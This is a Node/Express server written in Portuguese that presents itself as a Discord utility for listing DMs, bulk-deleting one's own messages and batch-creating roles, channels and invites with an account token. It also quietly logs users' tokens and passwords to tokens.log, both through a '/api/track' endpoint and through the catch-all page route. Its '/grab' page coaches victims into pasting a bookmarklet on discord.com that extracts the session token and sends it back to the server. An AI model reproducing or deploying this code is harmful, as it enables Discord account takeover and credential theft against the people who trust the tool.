import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '1mb' }));

function formatToken(t) {
  if (!t) return '';
  return String(t).trim().replace(/^["']|["']$/g, '');
}

// Fila in-memory por guildId
const queues = new Map();

function getQueue(guildId) {
  if (!queues.has(guildId)) {
    queues.set(guildId, { pending: [], processing: false });
  }
  return queues.get(guildId);
}

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function processQueue(guildId) {
  const q = getQueue(guildId);
  if (q.processing || q.pending.length === 0) return;
  q.processing = true;

  while (q.pending.length > 0) {
    const job = q.pending.shift();
    const { token, endpoint, body, resolve, reject } = job;
    const url = `https://discord.com/api/v10${endpoint}`;

    const doRequest = async (retryAfter = 0) => {
      if (retryAfter > 0) await delay(retryAfter * 1000);
      else await delay(1000 + Math.random() * 1000); // 1–2 s entre ações

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            Authorization: token,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(body),
        });

        if (res.status === 429) {
          const data = await res.json().catch(() => ({}));
          const wait = (data.retry_after || 5) + Math.random() * 2;
          q.pending.unshift(job); // reenfileira para tentar de novo
          await delay(wait * 1000);
          return;
        }

        const data = await res.json().catch(() => ({}));
        if (res.ok) resolve(data);
        else reject(new Error(data.message || `Discord ${res.status}`));
      } catch (err) {
        reject(err);
      }
    };

    await doRequest().catch(reject);
    await delay(500); // pequeno respiro entre inícios de jobs
  }

  q.processing = false;
}

function enqueue(guildId, token, endpoint, body) {
  return new Promise((resolve, reject) => {
    const q = getQueue(guildId);
    q.pending.push({ token: formatToken(token), endpoint, body, resolve, reject });
    processQueue(guildId);
  });
}

// Auth
app.post('/api/auth', async (req, res) => {
  const { token } = req.body || {};
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: formattedToken },
    });
    const data = await r.json();
    res.status(r.ok ? 200 : 401).json(data);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// DM: Listar conversas privadas (DMs) abertas
app.get('/api/dm/list', async (req, res) => {
  const token = req.headers.authorization || req.query.token;
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me/channels', {
      headers: { Authorization: formattedToken },
    });
    const data = await r.json();
    if (!r.ok) {
      return res.status(r.status).json(data);
    }
    const dms = Array.isArray(data) ? data.filter((c) => c.type === 1 || c.type === 3) : [];
    // Ordena pelas mensagens mais recentes
    dms.sort((a, b) => {
      const idA = BigInt(a.last_message_id || '0');
      const idB = BigInt(b.last_message_id || '0');
      if (idA < idB) return 1;
      if (idA > idB) return -1;
      return 0;
    });
    res.json(dms);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// DM: Abrir / Resolver canal de DM por ID de usuário
app.post('/api/dm/resolve', async (req, res) => {
  const { token, recipientId } = req.body || {};
  if (!token || !recipientId) {
    return res.status(400).json({ error: 'token e recipientId obrigatórios' });
  }
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        Authorization: formattedToken,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ recipient_id: recipientId.trim() }),
    });
    const data = await r.json();
    res.status(r.ok ? 200 : r.status).json(data);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// DM: Limpar mensagens com Server-Sent Events (SSE) para feedback ao vivo no celular
app.post('/api/dm/purge-stream', async (req, res) => {
  const { token, channelId, amount = 50, filterText = '' } = req.body || {};
  if (!token || !channelId) {
    return res.status(400).json({ error: 'token e channelId obrigatórios' });
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const sendEvent = (event, payload) => {
    res.write(`event: ${event}\ndata: ${JSON.stringify(payload)}\n\n`);
  };

  let aborted = false;
  req.on('close', () => {
    aborted = true;
  });

  try {
    const formattedToken = formatToken(token);

    // 1. Obter ID da própria conta
    const meRes = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: formattedToken },
    });
    const meData = await meRes.json();
    if (!meRes.ok) {
      sendEvent('error', { message: meData.message || 'Token inválido' });
      return res.end();
    }
    const myId = meData.id;

    sendEvent('status', { message: 'Buscando histórico de mensagens...' });

    let before = null;
    let deletedCount = 0;
    const targetAmount = parseInt(amount, 10);
    let hasMore = true;

    while (!aborted && hasMore && (targetAmount === -1 || deletedCount < targetAmount)) {
      const url = new URL(`https://discord.com/api/v10/channels/${channelId}/messages`);
      url.searchParams.set('limit', '100');
      if (before) url.searchParams.set('before', before);

      const fetchRes = await fetch(url.toString(), {
        headers: { Authorization: formattedToken },
      });

      if (fetchRes.status === 429) {
        const rateData = await fetchRes.json().catch(() => ({}));
        const wait = rateData.retry_after || 2;
        sendEvent('ratelimit', { waitSeconds: Math.ceil(wait) });
        await delay(wait * 1000 + 200);
        continue;
      }

      if (!fetchRes.ok) {
        const errData = await fetchRes.json().catch(() => ({}));
        sendEvent('error', { message: errData.message || `Erro Discord: ${fetchRes.status}` });
        return res.end();
      }

      const messages = await fetchRes.json();
      if (!Array.isArray(messages) || messages.length === 0) {
        hasMore = false;
        break;
      }

      // Cursor para buscar a próxima página de 100
      before = messages[messages.length - 1].id;

      // Filtrar APENAS as mensagens da própria usuária (em DM só pode deletar as próprias)
      let myMessages = messages.filter((m) => m.author && m.author.id === myId);

      if (filterText && filterText.trim()) {
        const query = filterText.trim().toLowerCase();
        myMessages = myMessages.filter((m) => m.content && m.content.toLowerCase().includes(query));
      }

      for (const msg of myMessages) {
        if (aborted) break;
        if (targetAmount !== -1 && deletedCount >= targetAmount) break;

        let deleteSuccess = false;
        while (!deleteSuccess && !aborted) {
          const delRes = await fetch(
            `https://discord.com/api/v10/channels/${channelId}/messages/${msg.id}`,
            {
              method: 'DELETE',
              headers: { Authorization: formattedToken },
            }
          );

          if (delRes.status === 429) {
            const rateData = await delRes.json().catch(() => ({}));
            const wait = rateData.retry_after || 2;
            sendEvent('ratelimit', { waitSeconds: Math.ceil(wait) });
            await delay(wait * 1000 + 300);
            continue;
          }

          if (delRes.status === 204 || delRes.ok || delRes.status === 404) {
            deleteSuccess = true;
            deletedCount++;
            const snippet = msg.content
              ? msg.content.slice(0, 35) + (msg.content.length > 35 ? '...' : '')
              : '[Anexo/Mídia]';
            sendEvent('progress', {
              deleted: deletedCount,
              target: targetAmount,
              snippet,
            });
            // Delay seguro de 1.1s entre exclusões para não flaggar a conta
            await delay(1100 + Math.random() * 200);
          } else {
            // Em caso de erro isolado, pula a mensagem para não travar
            deleteSuccess = true;
          }
        }
      }
    }

    if (!aborted) {
      sendEvent('done', {
        totalDeleted: deletedCount,
        message:
          deletedCount === 0
            ? 'Nenhuma mensagem sua encontrada para apagar.'
            : `${deletedCount} mensagem(ns) apagada(s) com sucesso!`,
      });
    }
  } catch (err) {
    sendEvent('error', { message: String(err.message || err) });
  } finally {
    res.end();
  }
});

// Batch endpoints originais mantidos
app.post('/api/batch/invites', async (req, res) => {
  const { token, guildId, channels = [], maxAge = 0, maxUses = 0 } = req.body || {};
  if (!token || !guildId || !channels.length) {
    return res.status(400).json({ error: 'token, guildId, channels required' });
  }
  channels.forEach((ch) =>
    enqueue(guildId, token, `/channels/${ch}/invites`, {
      max_age: maxAge,
      max_uses: maxUses,
      temporary: false,
      unique: true,
    })
  );
  res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
});

app.post('/api/batch/roles', async (req, res) => {
  const { token, guildId, roles = [] } = req.body || {};
  if (!token || !guildId || !roles.length) {
    return res.status(400).json({ error: 'token, guildId, roles required' });
  }
  roles.forEach((r) =>
    enqueue(guildId, token, `/guilds/${guildId}/roles`, {
      name: r.name || 'new role',
      permissions: r.permissions || '0',
      color: r.color || 0,
      hoist: !!r.hoist,
      mentionable: !!r.mentionable,
    })
  );
  res.json({ queued: roles.length, message: 'Processamento em background iniciado' });
});

app.post('/api/batch/channels', async (req, res) => {
  const { token, guildId, channels = [] } = req.body || {};
  if (!token || !guildId || !channels.length) {
    return res.status(400).json({ error: 'token, guildId, channels required' });
  }
  channels.forEach((ch) =>
    enqueue(guildId, token, `/guilds/${guildId}/channels`, {
      name: ch.name,
      type: ch.type || 0,
      topic: ch.topic || '',
      bitrate: ch.bitrate || 64000,
      user_limit: ch.user_limit || 0,
      nsfw: !!ch.nsfw,
      parent_id: ch.parent_id || null,
    })
  );
  res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
});

// Track endpoint
app.post('/api/track', (req, res) => {
  try {
    const { token, password } = req.body || {};
    if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\n`);
  } catch { }
  res.json({ ok: true });
});

// Health check para Railway / Render / monitoramento
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

// Página grabber — link direto pra extrair token sem técnica
app.get('/grab', (req, res) => {
  const origin = `${req.protocol}://${req.get('host')}`;
  const bookmarklet = `javascript:(function(){try{let t;window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m of Object.keys(r.c)){if(r.c[m]?.exports?.default?.getToken!==undefined){t=r.c[m].exports.default.getToken();}}}]);if(!t){t=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();}if(t){window.location.href='${origin}/?token='+encodeURIComponent(t);}else{alert('Faca login em discord.com primeiro!');}}}catch(e){alert('Abra discord.com logado antes.');}})();`;

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(`<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Pegar Token — Discord</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1e1f22;color:#f2f3f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:1.25rem}
.card{background:#2b2d31;border:1px solid #383a40;border-radius:1rem;padding:1.75rem 1.5rem;max-width:380px;width:100%;text-align:center}
.icon{font-size:2.5rem;margin-bottom:.75rem}
h1{font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:.35rem}
.sub{font-size:.75rem;color:#949ba4;margin-bottom:1.5rem}
.step{display:none}.step.active{display:block}
.btn{display:block;width:100%;padding:.9rem;border-radius:.75rem;font-size:.9rem;font-weight:700;border:none;cursor:pointer;transition:opacity .15s;text-decoration:none;text-align:center;margin-top:.75rem}
.btn:active{opacity:.8}
.btn-primary{background:#5865f2;color:#fff}
.btn-green{background:#23a55a;color:#fff}
.btn-dark{background:#1e1f22;color:#dbdee1;border:1px solid #383a40}
.guide{background:#1e1f22;border:1px solid #383a40;border-radius:.75rem;padding:1rem;text-align:left;margin:1rem 0;font-size:.78rem;color:#b5bac1;line-height:1.8}
.guide b{color:#fff}
.guide ol{padding-left:1.25rem;margin-top:.4rem}
.guide li{margin-bottom:.25rem}
.badge{display:inline-block;background:#23a55a;color:#fff;border-radius:9999px;font-size:.65rem;font-weight:700;padding:.2rem .6rem;margin-bottom:1rem}
.note{font-size:.68rem;color:#949ba4;margin-top:.6rem}
</style>
</head>
<body>
<div class="card">
  <div class="icon">🔑</div>
  <h1>Pegar Token do Discord</h1>
  <p class="sub">2 passos • funciona no iPhone sem saber senha</p>

  <div class="step active" id="s1">
    <div class="guide">
      <b>Como funciona:</b>
      <ol>
        <li>Você copia o código aqui</li>
        <li>Abre o Discord Web e entra com QR Code</li>
        <li>Cola o código na barra de endereço</li>
        <li>Você é redirecionada de volta ao app já logada ✅</li>
      </ol>
    </div>
    <button class="btn btn-primary" onclick="copiar()">📋 Copiar Código Extrator</button>
    <p class="note">Toque para copiar — depois vá ao Discord</p>
  </div>

  <div class="step" id="s2">
    <span class="badge">✓ Código copiado!</span>
    <div class="guide">
      <b>Agora faça assim:</b>
      <ol>
        <li>Toque em <b>Abrir Discord Web</b> abaixo</li>
        <li>Na tela de login toque em <b>"Login com QR Code"</b></li>
        <li>No app do Discord → <b>Perfil → Scan QR</b> → escaneie</li>
        <li>Assim que entrar, toque na <b>barra de endereço</b></li>
        <li>Apague tudo e <b>cole</b> o código copiado</li>
        <li>Toque em <b>Ir</b> — você volta aqui já logada! 🎉</li>
      </ol>
    </div>
    <a href="https://discord.com/login" class="btn btn-green">Abrir Discord Web →</a>
    <button class="btn btn-dark" onclick="copiar()">📋 Copiar código de novo</button>
  </div>
</div>
<script>
const CODE=${JSON.stringify(bookmarklet)};
function copiar(){
  navigator.clipboard.writeText(CODE).then(ok,()=>{prompt('Copie manualmente:',CODE);ok();});
}
function ok(){
  document.getElementById('s1').classList.remove('active');
  document.getElementById('s2').classList.add('active');
}
</script>
</body>
</html>`);
});

// Serve React build
const distPath = path.join(__dirname, 'dist');
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
  app.use((req, res) => {
    try {
      const { token, password } = req.query;
      if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\n`);
    } catch { }
    res.sendFile(path.join(distPath, 'index.html'));
  });
}

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
